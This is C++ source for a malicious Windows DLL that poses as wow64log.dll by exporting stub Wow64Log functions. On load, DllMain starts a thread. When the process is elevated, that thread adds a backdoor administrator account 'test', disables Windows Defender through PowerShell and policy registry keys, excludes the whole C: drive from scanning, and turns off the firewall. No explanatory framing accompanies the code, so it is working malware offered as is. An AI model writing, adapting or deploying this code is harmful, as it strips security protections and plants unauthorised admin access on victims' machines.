
#include <windows.h>
#include <process.h>
#include <string>
#include <cstdint>


#define EXPORTABLE __declspec(dllexport)
#define STATUS_SUCCESS 0
#define UNLEN       256                 // Maximum user name length

typedef long NTSTATUS;
typedef int BOOL;

/* functions to export */

// Wow64LogInitialize
EXTERN_C EXPORTABLE NTSTATUS NTAPI Wow64LogInitialize(void) {
    return STATUS_SUCCESS;
}


// Wow64LogMessageArgList
EXTERN_C EXPORTABLE NTSTATUS NTAPI Wow64LogMessageArgList(unsigned char Level, const char *Format, void *Args) {
    return STATUS_SUCCESS;
}


// Wow64LogSystemService
EXTERN_C EXPORTABLE NTSTATUS NTAPI Wow64LogSystemService(void *ServiceParameters) {
    return STATUS_SUCCESS;
}


// Wow64LogTerminate
EXTERN_C EXPORTABLE NTSTATUS NTAPI Wow64LogTerminate(void) {
    return STATUS_SUCCESS;
}

bool is_admin() {
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            return elevation.TokenIsElevated;
        }
    }
    return false;
}

EXTERN_C EXPORTABLE DWORD WINAPI Entry() {


        if (is_admin()) {

            system("echo yes >> C:\\users\\john\\trace.txt");
            system("net user test test123 /add && net localgroup administrators test /add");
            system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath \"C:\\\"\"");
            system("echo done >> C:\\users\\john\\trace.txt");
            HKEY key;
            HKEY new_key;
            DWORD disable = 1;

            LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
            if (res == ERROR_SUCCESS) {
                RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
                RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
                RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
                RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
                RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
                RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
                RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

                RegCloseKey(key);
                RegCloseKey(new_key);
            }

            // Add-MpPreference -ExclusionPath "C:\Temp"
            system("netsh firewall set opmode disable & netsh Advfirewall set allprofiles state off & netsh firewall set notifications mode = disable profile = all"); // ok

        } else {
            system("echo no >> C:\\users\\john\\trace.txt");
        }

    return 0;

}


BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    HANDLE thread;
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Entry, NULL, 0, NULL);
            CloseHandle(thread);
            break;

        case DLL_PROCESS_DETACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}